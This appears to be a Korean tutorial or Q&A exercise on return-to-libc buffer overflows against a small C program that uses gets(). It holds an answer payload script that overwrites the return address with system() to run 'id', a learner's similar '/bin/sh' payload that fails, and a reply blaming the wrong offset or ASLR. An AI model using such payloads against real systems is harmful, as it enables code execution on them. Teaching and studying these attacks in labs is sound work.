rtl_test.c :
    // system function address : 0xf7e3dda0
    // "id" string address : 0xf7f5e988
    #include <stdio.h>
    
    int main(void){
        
        char buf[32];
        
        gets(buf);
        return 0;
    }

    답 : 
        input : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Ýã÷XXXXéõ÷
            (hex encode : 616161616161616161616161616161616161616161616161616161616161616161616161a0dde3f75858585888e9f5f7)
        uid=1001(theori) gid=1001(theori) groups=1001(theori)

answer.py :
    payload = "A"*(32+4)
    payload += "\xa0\xdd\xe3\xf7"
    payload += "XXXX"
    payload += "\x88\xe9\xf5\xf7"

    print payload



system 주소가 0xf7e3cdb0, "/bin/sh"문자열의 주소가 0xf7f5db0b로 나오고 gdb에서 돌렸을 때도 예제에서와 달리 eip는 vuln+6을 저장하고, esp-4도 아예 다른 값들을 저장합니다…
$ ./ex1_nx python -c 'print "A"*36 + "\xb0\xcd\xe3\xf7" + "BBBB" + "\x0b\xdb\xf5\xf7"'로 실행시켰을 때도 Segmentation fault(Core dumpled)가 뜹니다. 컴파일 방식이 달라지더라도 기법자체는 그대로 적용할 수 있을 텐데 왜 이렇게 아예 잘못된 결과가 나오는건지 궁금합니다!

print "A"*36 + "\xb0\xcd\xe3\xf7" + "BBBB" + "\x0b\xdb\xf5\xf7"

제가 생각해본 이유는 두 가지가 있습니다.

첫 번째
"A"*36은 필요한 이유가 buf로부터 리턴주소까지의 거리가 36바이트라서 채워넣는 것입니다. gdb로 어셈블리 코드를 보면서 정말로 buf와 리턴주소가 36바이트만큼 차이가 나는지 확인해볼 필요가 있습니다.

두 번째
"\xb0\xcd\xe3\xf7"는 system 함수의 주소가 올 자리입니다. 리눅스는 기본적으로 ASLR 이라는 기법이 적용되었기 때문에 libc의 로드 위치가 실행할 때마다 달라집니다. 그래서 디버깅할 때 알아낸 주소 "\xb0\xcd\xe3\xf7"가 나중에는 system 함수의 주소가 아닐 수 있습니다.



























